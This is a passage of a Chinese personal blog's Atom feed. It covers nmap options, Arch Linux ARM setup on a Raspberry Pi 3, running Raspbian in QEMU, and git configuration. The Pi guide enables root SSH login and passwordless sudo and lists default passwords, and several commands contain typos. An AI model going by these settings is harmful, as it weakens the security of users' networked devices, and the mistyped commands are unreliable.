追加到指定的文件</div><div class="line">--resume FILENAME       恢复已停止的扫描</div><div class="line">--stylesheet PATH/URL   设置XSL样式表，转换XML输出</div><div class="line">--webxml                从namp.org得到XML的样式</div><div class="line">--no-sytlesheet         忽略XML声明的XSL样式表</div></pre></td></tr></table></figure>
+<h3 id="其他选项"><a href="#其他选项" class="headerlink" title="其他选项"></a>其他选项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-6                      开启IPv6</div><div class="line">-A                      OS识别,版本探测,脚本扫描和traceroute</div><div class="line">--datedir DIRNAME       说明用户Nmap数据文件位置</div><div class="line">--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送</div><div class="line">--privileged            假定用户具有全部权限</div><div class="line">--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限</div><div class="line">-V                      打印版本信息</div><div class="line">-h                      输出帮助</div></pre></td></tr></table></figure>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>应为脚本很多没办法说明详细查看翻译的<a href="https://t0data.gitbooks.io/nmap-nse/content/chapter1.html" rel="external nofollow noopener noreferrer" target="_blank">nmap脚本引擎</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;nmap-常用参数&quot;&gt;&lt;a href=&quot;#nmap-常用参数&quot; class=&quot;headerlink&quot; title=&quot;nmap 常用参数&quot;&gt;&lt;/a&gt;nmap 常用参数&lt;/h2&gt;&lt;h3 id=&quot;主机发现&quot;&gt;&lt;a href=&quot;#主机发现&quot; class=&quot;headerli
+    
+    </summary>
+    
+      <category term="工具" scheme="https://www.sysblz.com/categories/tools/"/>
+    
+    
+      <category term="Linux" scheme="https://www.sysblz.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>树莓派3下arch Linux arm 一些优化</title>
+    <link href="https://www.sysblz.com/article/13694117.html"/>
+    <id>https://www.sysblz.com/article/13694117.html</id>
+    <published>2017-08-31T03:09:05.000Z</published>
+    <updated>2017-08-31T03:09:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="树莓派安装arch-Linux-系统优化"><a href="#树莓派安装arch-Linux-系统优化" class="headerlink" title="树莓派安装arch Linux 系统优化"></a>树莓派安装arch Linux 系统优化</h1><p>没有显示器和键盘的自己找路由器里面的树莓派IP ssh登录<br>默认ssh用户：alarm<br>默认ssh密码：alarm<br>默认root用户密码也是root</p>
+<h2 id="0-修改中科大源"><a href="#0-修改中科大源" class="headerlink" title="0. 修改中科大源"></a>0. 修改中科大源</h2><p>修改为中科大的源<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nano /etc/pacman.d/mirrorlist</div><div class="line">Server = http://mirrors.ustc.edu.cn/archlinuxarm/<span class="variable">$arch</span>/<span class="variable">$repo</span></div></pre></td></tr></table></figure></p>
+<h2 id="1-更新系统"><a href="#1-更新系统" class="headerlink" title="1. 更新系统"></a>1. 更新系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pacman -Syu</div></pre></td></tr></table></figure>
+<h2 id="2-添加普通用户root权限sudo"><a href="#2-添加普通用户root权限sudo" class="headerlink" title="2. 添加普通用户root权限sudo"></a>2. 添加普通用户root权限sudo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">su <span class="comment">#提示输入root密码</span></div><div class="line">pacman -S sudo</div><div class="line">nano /etc/sudoers</div></pre></td></tr></table></figure>
+<p>取消这两行注释，或者在最后添加这两行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">%wheel ALL=(ALL) ALL</div><div class="line"></div><div class="line">%wheel ALL=(ALL) NOPASSWD: ALL</div></pre></td></tr></table></figure></p>
+<h2 id="3-修改默认用户和root默认密码"><a href="#3-修改默认用户和root默认密码" class="headerlink" title="3. 修改默认用户和root默认密码"></a>3. 修改默认用户和root默认密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo passwd alarm</div><div class="line">sudo passwd root</div></pre></td></tr></table></figure>
+<h2 id="4-添加自己好记的普通用户"><a href="#4-添加自己好记的普通用户" class="headerlink" title="4. 添加自己好记的普通用户"></a>4. 添加自己好记的普通用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo useradd -d /home/mofeng -m mofeng</div><div class="line">sudo passwd mofeng</div></pre></td></tr></table></figure>
+<h2 id="5-开启ssh登录的root权限"><a href="#5-开启ssh登录的root权限" class="headerlink" title="5. 开启ssh登录的root权限"></a>5. 开启ssh登录的root权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nano /etc/ssh/sshd_config</div><div class="line">PermitRootLogin yes</div></pre></td></tr></table></figure>
+<h2 id="6-修改树莓派名称"><a href="#6-修改树莓派名称" class="headerlink" title="6. 修改树莓派名称"></a>6. 修改树莓派名称</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nano /etc/hostname</div></pre></td></tr></table></figure>
+<h2 id="7-安装常用工具"><a href="#7-安装常用工具" class="headerlink" title="7. 安装常用工具"></a>7. 安装常用工具</h2><p>wget git curl vim 这几个我经常用到所以先安装了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pacman -S wget git curl vim</div></pre></td></tr></table></figure></p>
+<h2 id="8-安装aru支持（yaourt）工具"><a href="#8-安装aru支持（yaourt）工具" class="headerlink" title="8. 安装aru支持（yaourt）工具"></a>8. 安装aru支持（yaourt）工具</h2><p>yaourt 编译的时候的环境可能缺少所以先安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pacman -S base-devel</div></pre></td></tr></table></figure></p>
+<p>编译yaourt相关依赖<a href="http://doku.ben00it.fr/dokuwiki/doku.php?id=linux:raspberry:yaourt" rel="external nofollow noopener noreferrer" target="_blank">参照文件</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pacman -S gcc cmake fakeroot pkg-config</div></pre></td></tr></table></figure>
+<p>安装yajl，有能力的自己编译安装，参照文件有写为什么要这样做我简单化不去多做解释</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /tmp/</div><div class="line">mkdir yajl</div><div class="line"><span class="built_in">cd</span> yajl</div><div class="line">vim PKGBUILD</div><div class="line">makepkg -Acs</div><div class="line">sudo pacman -U yajl-2.1.0-1-armv7h.pkg.tar.xz</div></pre></td></tr></table></figure>
+<p>PKGBUILD文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"># Maintainer: Dave Reisner &lt;d@falconindy.com&gt;</div><div class="line"># Contributor: Daniel J Griffiths &lt;ghost1227@archlinux.us&gt;</div><div class="line"># Contributor: Thomas Dziedzic &lt; gostrc at gmail &gt;</div><div class="line"># Contributor: Andrej Gelenberg &lt;andrej.gelenberg@udo.edu&gt;</div><div class="line"></div><div class="line">pkgname=yajl</div><div class="line">pkgver=2.1.0</div><div class="line">pkgrel=1</div><div class="line">pkgdesc=&apos;Yet Another JSON Library&apos;</div><div class="line">arch=(&apos;i686&apos; &apos;x86_64&apos; &apos;armv7&apos; &apos;armv7h&apos; &apos;armv7l&apos;)</div><div class="line">url=&apos;http://lloyd.github.com/yajl/&apos;</div><div class="line">license=(&apos;ISC&apos;)</div><div class="line">makedepends=(&apos;gcc&apos; &apos;make&apos; &apos;cmake&apos;)</div><div class="line">source=(&quot;$pkgname-$pkgver.tar.gz::https://github.com/lloyd/$pkgname/archive/$pkgver.tar.gz&quot;)</div><div class="line">md5sums=(&apos;6887e0ed7479d2549761a4d284d3ecb0&apos;)</div><div class="line">build() &#123;</div><div class="line">  cd &quot;$pkgname-$pkgver&quot;</div><div class="line">  cmake -DCMAKE_INSTALL_PREFIX=/usr .</div><div class="line">  make</div><div class="line">&#125;</div><div class="line">package() &#123;</div><div class="line">  cd &quot;$pkgname-$pkgver&quot;</div><div class="line">  make DESTDIR=&quot;$pkgdir&quot; install</div><div class="line">  install -Dm644 COPYING &quot;$pkgdir/usr/share/licenses/$&#123;pkgname&#125;/LICENSE&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>package-query安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /tmp</div><div class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/package-query-git.git</div><div class="line"><span class="built_in">cd</span> package-query-git</div><div class="line">makepkg -Acs</div><div class="line">pacman -U package-query-*.xz</div></pre></td></tr></table></figure>
+<p>yaourt 安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /tmp/</div><div class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/yaourt.git</div><div class="line">makepkg -Acs</div><div class="line">sudo pacman -U yaourt*.tar.xz</div></pre></td></tr></table></figure></p>
+<h2 id="9-网络工具包"><a href="#9-网络工具包" class="headerlink" title="9. 网络工具包"></a>9. 网络工具包</h2><p>ifconfig,route在net-tools中，nslookup,dig在dnsutils中，ftp,telnet等在inetutils中,ip命令在iproute2中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pacman -S net-tools dnsutils inetutils iproute2</div></pre></td></tr></table></figure>
+<h2 id="10-boot-config-txt优化"><a href="#10-boot-config-txt优化" class="headerlink" title="10. /boot/config.txt优化"></a>10. /boot/config.txt优化</h2><h4 id="10-1-音频"><a href="#10-1-音频" class="headerlink" title="10.1 音频"></a>10.1 音频</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">pacman -S alsa-utils</div><div class="line"></div><div class="line"><span class="comment"># 配置文件中添加</span></div><div class="line">dtparam=audio=on</div><div class="line">hdmi_drive=2 <span class="comment">#HDMI输出音频</span></div><div class="line">audio_pwm_mode=2 <span class="comment">#3.5mm口输出音频</span></div></pre></td></tr></table></figure>
+<h4 id="10-2-开启GPIO"><a href="#10-2-开启GPIO" class="headerlink" title="10.2 开启GPIO"></a>10.2 开启GPIO</h4><p>如果你你们安装yaourt要不你自己手工安装，或者在去aur查找<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yaourt -S python-raspberry-gpio</div></pre></td></tr></table></figure></p>
+<h4 id="10-3-开启I2C"><a href="#10-3-开启I2C" class="headerlink" title="10.3 开启I2C"></a>10.3 开启I2C</h4><p>安装i2c-tools和lm_sensors包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yaourt -S i2c-tools lm_sensors</div></pre></td></tr></table></figure>
+<p>/boot/config.txt中开启i2c的支持</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtparam=i2c_arm=on</div></pre></td></tr></table></figure>
+<h2 id="11-安装补全"><a href="#11-安装补全" class="headerlink" title="11. 安装补全"></a>11. 安装补全</h2><h4 id="11-1-shell自动高级补全"><a href="#11-1-shell自动高级补全" class="headerlink" title="11.1 shell自动高级补全"></a>11.1 shell自动高级补全</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S bash-completion</div></pre></td></tr></table></figure>
+<h4 id="11-2-git命令补全"><a href="#11-2-git命令补全" class="headerlink" title="11.2 git命令补全"></a>11.2 git命令补全</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S git-completion</div></pre></td></tr></table></figure>
+<p>编辑用户环境变量~/.bashrc<br>在最后添加下面一句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#completion</span></div><div class="line">[ -f /usr/share/git/completion/git-completion.bash ] &amp;&amp; <span class="built_in">source</span> /usr/share/git/completion/git-completion.bash</div></pre></td></tr></table></figure></p>
+<h2 id="12-安装中文"><a href="#12-安装中文" class="headerlink" title="12. 安装中文"></a>12. 安装中文</h2><h4 id="12-1-中文环境支持"><a href="#12-1-中文环境支持" class="headerlink" title="12.1 中文环境支持"></a>12.1 中文环境支持</h4><p>修改/etc/locale.gen文件添加编码支持<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#取消文件的下面两项</span></div><div class="line">en_US.UTF-8 UTF-8</div><div class="line">zh_CN.UTF-8 UTF-8</div><div class="line"><span class="comment">#执行下面命令更新安装</span></div><div class="line">sudo locale-gen</div><div class="line">sudo /etc/locale.conf</div><div class="line"><span class="comment">#修改LANG</span></div><div class="line">LANG=en_US.UTF-8</div></pre></td></tr></table></figure></p>
+<h4 id="12-2-安装字体"><a href="#12-2-安装字体" class="headerlink" title="12.2 安装字体"></a>12.2 安装字体</h4><p>安装免费字体<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S noto-fonts-cjk cantarell-fonts</div><div class="line"><span class="comment">#重启系统后应该是能显示中文</span></div></pre></td></tr></table></figure></p>
+<h2 id="13-WIFI配置"><a href="#13-WIFI配置" class="headerlink" title="13. WIFI配置"></a>13. WIFI配置</h2><h4 id="13-1-配置WIFI"><a href="#13-1-配置WIFI" class="headerlink" title="13.1 配置WIFI"></a>13.1 配置WIFI</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/netctl</div><div class="line">sudo install -m640 examples/wireless-wpa wpa</div><div class="line">sudo vim wpa</div><div class="line"><span class="comment">#修改MyNetwork和WirelessKey（MyNetwork=WIFI名称，WirelessKey=WIFI密码）</span></div><div class="line"><span class="comment">#启动WIFI配置</span></div><div class="line">netctl start wap</div></pre></td></tr></table></figure>
+<p>使用命令ifconfig查看wlan0接口是否启动</p>
+<p>如果你想开机就启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netctl <span class="built_in">enable</span> wpa</div></pre></td></tr></table></figure></p>
+<p><a href="https://rocka.me/archive/my-first-archlinux-rpi3" rel="external nofollow noopener noreferrer" target="_blank">无桌面参考</a><br><a href="https://zhuanlan.zhihu.com/p/25988799" rel="external nofollow noopener noreferrer" target="_blank">配置桌面环境参考</a><br><a href="https://www.yumao.name/read/archlinux-systemd-rc-local/" rel="external nofollow noopener noreferrer" target="_blank">arch中添加rc.locl启动</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;树莓派安装arch-Linux-系统优化&quot;&gt;&lt;a href=&quot;#树莓派安装arch-Linux-系统优化&quot; class=&quot;headerlink&quot; title=&quot;树莓派安装arch Linux 系统优化&quot;&gt;&lt;/a&gt;树莓派安装arch Linux 系统优化&lt;/h1&gt;&lt;
+    
+    </summary>
+    
+      <category term="树莓派" scheme="https://www.sysblz.com/categories/rpilinux/"/>
+    
+    
+      <category term="rpi" scheme="https://www.sysblz.com/tags/rpi/"/>
+    
+      <category term="arch" scheme="https://www.sysblz.com/tags/arch/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>qemu模拟arm架构运行raspberrypi</title>
+    <link href="https://www.sysblz.com/article/2904670243.html"/>
+    <id>https://www.sysblz.com/article/2904670243.html</id>
+    <published>2017-08-29T09:48:52.000Z</published>
+    <updated>2017-08-30T14:21:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote>
+<p>很早以前的树莓派B板，前两天升级内核果断的停止工作了，可是我一直拿他做数据库服务器。我的数据全没有了。<br>所以逼得没办法只能qemu模拟的方式启动树莓派系统。现在终于把数据库备份出来了。数据无价请做好备份！！哎！<br>这次qemu方式加载中一个学习记录记住万一那天我又用上了不用在到处找了</p>
+</blockquote>
+<h1 id="Arch-Linux-Install-QEMU"><a href="#Arch-Linux-Install-QEMU" class="headerlink" title="Arch Linux Install QEMU"></a>Arch Linux Install QEMU</h1><p>安装QEMU<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yaourt -S qemu</div><div class="line">#因为我们要运行arm架构所以安装qemu-arch-extra 包</div><div class="line">yaourt -S qemu-arch-extra</div></pre></td></tr></table></figure></p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h4 id="1-raspbian-镜像准备"><a href="#1-raspbian-镜像准备" class="headerlink" title="1. raspbian 镜像准备"></a>1. raspbian 镜像准备</h4><p><a href="https://www.raspberrypi.org/downloads/" rel="external nofollow noopener noreferrer" target="_blank">官网下载</a><br><a href="https://downloads.raspberrypi.org/" rel="external nofollow noopener noreferrer" target="_blank">下载库</a><br>我下载的是最小树莓派系统：<a href="https://downloads.raspberrypi.org/raspbian_lite/images/raspbian_lite-2017-08-17/2017-08-16-raspbian-stretch-lite.zip" rel="external nofollow noopener noreferrer" target="_blank">2017-08-16-raspbian-stretch-lite.zip</a></p>
+<h4 id="2-内核准备"><a href="#2-内核准备" class="headerlink" title="2. 内核准备"></a>2. 内核准备</h4><h6 id="2-1-自己编译内核-QEMU启动失败，不过保留方法以后替换内核懒得查找"><a href="#2-1-自己编译内核-QEMU启动失败，不过保留方法以后替换内核懒得查找" class="headerlink" title="2.1. 自己编译内核(QEMU启动失败，不过保留方法以后替换内核懒得查找)"></a>2.1. 自己编译内核(QEMU启动失败，不过保留方法以后替换内核懒得查找)</h6><blockquote>
+<p>os rasbian 使用的内核版本uanem -r查看内部版本号<br>内核下载:</p>
+<ol>
+<li><a href="https://github.com/raspberrypi/linux" rel="external nofollow noopener noreferrer" target="_blank">raspberrypi linux</a>(git cloen <a href="https://github.com/raspberrypi/linux.git" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/raspberrypi/linux.git</a>)</li>
+<li><a href="https://www.kernel.org/" rel="external nofollow noopener noreferrer" target="_blank">linux-kernel 归档</a>能找到最新稳定版本内核</li>
+<li><a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.84.tar.xz" rel="external nofollow noopener noreferrer" target="_blank">Linux-kernel-4.4.84</a></li>
+</ol>
+</blockquote>
+<h6 id="2-1-1-下载内核文件"><a href="#2-1-1-下载内核文件" class="headerlink" title="2.1.1 下载内核文件"></a>2.1.1 下载内核文件</h6><blockquote>
+<p>我SD的OS是raspberrypi所以我使用第一个内核文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#下载4.12.9版本内核</div><div class="line">wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.84.tar.xz</div><div class="line">xz -d linux-4.4.84.tar.xz &amp;&amp; tar -xvf linux-4.4.84.tar</div><div class="line">rm linux-4.4.84.tar</div><div class="line">cd linux-4.4.84/</div><div class="line">#raspberrypi内核</div><div class="line">git cloen https://github.com/raspberrypi/linux.git)</div><div class="line">cd linux</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h6 id="2-1-2-编译arm内核"><a href="#2-1-2-编译arm内核" class="headerlink" title="2.1.2 编译arm内核"></a>2.1.2 编译arm内核</h6><blockquote>
+<p>编译内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#设置编译环境变量</div><div class="line">export ARCH=arm</div><div class="line">export CROSS_COMPILE=arm-linux-gnueabihf-</div><div class="line">####如果你缺少arm-linux-gnueabi-gcc编译工具请安装</div><div class="line">yaourt -S arm-linux-gnueabihf-gcc</div><div class="line">####如果你嫌弃安装麻烦</div><div class="line">git clone https://github.com/raspberrypi/tools.git</div><div class="line">export PATH=$PATH:(你glone下来的路径)arm-bcm2708/gcc-linaro-arm-linux-gnueabihf-raspbian/bin</div><div class="line">###如我是64位的系统</div><div class="line">export PATH=/home/mofeng/work/linux-kernel/raspberrypi-tools/arm-bcm2708/gcc-linaro-arm-linux-gnueabihf-raspbian-x64/bin</div><div class="line">### 检查编译工具链是否完整</div><div class="line">arm-linux-gnueabihf-gcc -v</div><div class="line">###我选用默认配置</div><div class="line">make -j4  defconfig</div><div class="line">###改变配置</div><div class="line">make -j4 menuconfig</div><div class="line">##构建内核</div><div class="line">make -j4  #我PC的CPU核心是4核所以我-j4来加速编译</div><div class="line">##复制内核到上一级</div><div class="line">cp arch/arm/boot/Image ../kernel-rpi.img</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h6 id="2-2-别人编译好的qemu-kernel"><a href="#2-2-别人编译好的qemu-kernel" class="headerlink" title="2.2 别人编译好的qemu-kernel"></a>2.2 别人编译好的qemu-kernel</h6><p>这个是别人编译好的在<a href="https://github.com/dhruvvyas90/qemu-rpi-kernel" rel="external nofollow noopener noreferrer" target="_blank">github</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/dhruvvyas90/qemu-rpi-kernel.git</div><div class="line">cd qemu-rpi-kernel</div></pre></td></tr></table></figure></p>
+<p>文件里面有kernel-qemu-4.4.34-jessie编译好的内核，如果你还是想自己生成tool目录下有./build-kernel-qemu生成脚步</p>
+<p>下面我们使用4.4.34版本内核启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">qemu-system-arm -kernel kernel-qemu-4.4.34-jessie -cpu arm1176 -m 256 -M versatilepb -no-reboot -serial stdio -append &quot;root=/dev/sda2 panic=1 rootfstype=ext4 rw&quot; -redir tcp:5022::22 -hda /dev/sdb</div></pre></td></tr></table></figure>
+<blockquote>
+<p>参数解释<br>-kernel 内核文件<br>-cpu arm运行cpu可以qemu-arm -cpu help<br>-m 是内存大小<br>-M 支持的机器使用命令qemu-system-arm -M help查看 <a href="https://wiki.qemu.org/index.php/Documentation/Platforms/ARM" rel="external nofollow noopener noreferrer" target="_blank">wiki</a><br>-append 告诉内核参数<br>-hda 指定硬盘，也可以img文件</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;很早以前的树莓派B板，前两天升级内核果断的停止工作了，可是我一直拿他做数据库服务器。我的数据全没有了。&lt;br&gt;所以逼得没办法只能qemu模拟的方式启动树莓派系统。现在终于把数据库备份出来了。数据无价请做好备份！！哎！&lt;br&gt;这次qemu方式加载中一
+    
+    </summary>
+    
+      <category term="树莓派" scheme="https://www.sysblz.com/categories/rpilinux/"/>
+    
+    
+      <category term="Linux" scheme="https://www.sysblz.com/tags/Linux/"/>
+    
+      <category term="rpi" scheme="https://www.sysblz.com/tags/rpi/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>git 常用配置</title>
+    <link href="https://www.sysblz.com/article/4003623714.html"/>
+    <id>https://www.sysblz.com/article/4003623714.html</id>
+    <published>2017-08-24T08:22:28.000Z</published>
+    <updated>2019-03-30T19:32:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="arch-Linux中Git命令自动补全"><a href="#arch-Linux中Git命令自动补全" class="headerlink" title="arch Linux中Git命令自动补全"></a>arch Linux中Git命令自动补全</h2><p>刚从基于Debian系统转到基于arch Linux系统，结果用Git命令的时候发现Git命令自动没办法使用。查看wiki文件两种解决办法</p>
+<ol>
+<li><p>环境变量法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vim ~/bashrc</div><div class="line"><span class="comment">#添加一句</span></div><div class="line">[ -f /usr/share/git/completion/git-completion.bash ] &amp;&amp; <span class="built_in">source</span> /usr/share/git/completion/git-completion.bash</div><div class="line"><span class="comment">#刷新环境变量</span></div><div class="line"><span class="built_in">source</span> ~/bashrc</div></pre></td></tr></table></figure>
+</li>
+<li><p>安装bash-completlon</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yaourt -S bash-completion</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>参考：<a href="https://wiki.archlinux.org/index.php/git" rel="external nofollow noopener noreferrer" target="_blank">archlinux wiki</a></p>
+<p>顺便提一句防止自己忘记，git配置分级别：</p>
+<ol>
+<li>系统级别–system 写入/etc/gitconfig</li>
+<li>全局级别–global 写入~/.gitconfig或~/.config/git/config</li>
+<li>项目级别–local  写入仓库.git/config (平时写的时候直接省略直接写git config)</li>
+</ol>
+<p>配置分级优先级:项目级别–&gt;全局级别–&gt;系统级别</p>
+<h2 id="初始Git配置"><a href="#初始Git配置" class="headerlink" title="初始Git配置"></a>初始Git配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#设置全局用户信息</span></div><div class="line">git config  --global user.name wind</div><div class="line">git config  --global user.email @gmail.com</div><div class="line"><span class="comment">#也可以单独给项目设置用户去掉--global全局参数，参照</span></div><div class="line">git config user.name</div><div class="line"></div><div class="line"><span class="comment">#编辑工具</span></div><div class="line">git config  --global core.editor=vim</div><div class="line">git config  --global merge.tool=vimdiff</div></pre></td></tr></table></figure>
+<h2 id="Git认证，经常使用github经常输入密码太麻烦"><a href="#Git认证，经常使用github经常输入密码太麻烦" class="headerlink" title="Git认证，经常使用github经常输入密码太麻烦"></a>Git认证，经常使用github经常输入密码太麻烦</h2><p>Git认证有两种模式一种HTTPS和SSH</p>
+<h4 id="https认证设置"><a href="#https认证设置" class="headerlink" title="https认证设置"></a>https认证设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config --global credential.helper cache <span class="comment">#设置认证储存方式cache(15分钟缓存)，store(明文储存)</span></div></pre></td></tr></table></figure>
+<h4 id="SSH认证"><a href="#SSH认证" class="headerlink" title="SSH认证"></a>SSH认证</h4><ol>
+<li>生成ssh公私密匙<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -b 4096 -c “@gmail.com”</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>当前目录下会有刚刚要求你输入的id_rsa(私)和id_rsa.pub(公)</p>
+<ol>
+<li>上传公匙<br>公匙上传到github 【Settings】–&gt;【SSH and GPG keys】–&gt;【New SSH Key】</li>
+</ol>
+<p><img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fiuoz5sl3oj30wx0j4dhv.jpg" alt=""></p>
+<ol>
+<li><p>PC储存私匙到系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-add id_rsa</div></pre></td></tr></table></figure>
+</li>
+<li><p>验证公私密匙</p>
